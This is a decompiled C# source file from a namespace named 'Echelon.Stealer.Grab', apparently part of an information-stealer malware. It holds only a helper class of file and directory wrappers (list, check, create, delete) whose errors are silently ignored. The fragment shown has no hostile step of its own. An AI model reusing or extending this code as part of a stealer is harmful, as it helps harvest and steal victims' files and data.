using System;
using System.IO;

namespace Echelon.Stealer.Grab
{
	// Token: 0x0200002D RID: 45
	internal class Ober
	{
		// Token: 0x060000AA RID: 170 RVA: 0x00008B46 File Offset: 0x00006D46
		public static string AMBAL_GetExtension(object Kavo_s1)
		{
			return Path.GetExtension((string)Kavo_s1);
		}

		// Token: 0x060000AB RID: 171 RVA: 0x00008B53 File Offset: 0x00006D53
		public static string AMBAL_GetFileName(object Kavo_s1)
		{
			return Path.GetFileName((string)Kavo_s1);
		}

		// Token: 0x060000AC RID: 172 RVA: 0x00008B60 File Offset: 0x00006D60
		public static string AMBAL_GetDirName(object Kavo_s1)
		{
			return Path.GetDirectoryName((string)Kavo_s1);
		}

		// Token: 0x060000AD RID: 173 RVA: 0x00008B6D File Offset: 0x00006D6D
		public static string[] AMBAL_GetFiles(object Kavo_s1, object Kavo_s2, object Kavo_s3)
		{
			return Directory.GetFiles((string)Kavo_s1, (string)Kavo_s2, (SearchOption)Kavo_s3);
		}

		// Token: 0x060000AE RID: 174 RVA: 0x00008B86 File Offset: 0x00006D86
		public static bool AMBAL_FExist(object Kavo_s1)
		{
			return File.Exists((string)Kavo_s1);
		}

		// Token: 0x060000AF RID: 175 RVA: 0x00008B93 File Offset: 0x00006D93
		public static bool AMBAL_DExist(object Kavo_s1)
		{
			return Directory.Exists((string)Kavo_s1);
		}

		// Token: 0x060000B0 RID: 176 RVA: 0x0001C664 File Offset: 0x0001A864
		public static void AMBAL_CreateDir(object Kavo_s1)
		{
			try
			{
				Directory.CreateDirectory((string)Kavo_s1);
			}
			catch
			{
			}
		}

		// Token: 0x060000B1 RID: 177 RVA: 0x0001C694 File Offset: 0x0001A894
		public static void AMBAL_DeleteDir(object Kavo_s1)
		{
			try
			{
				Directory.Delete((string)Kavo_s1);
			}
			catch
			{
			}
		}

		// Token: 0x060000B2 RID: 178 RVA: 0x0001C6C4 File Offset: 0x0001A8C4
		public static void AMBAL_FDelete(object Kavo_s1)
		{
			try
			{
				File.Delete((string)Kavo_s1);
			}
			catch
			{
			}
		}
	}
}
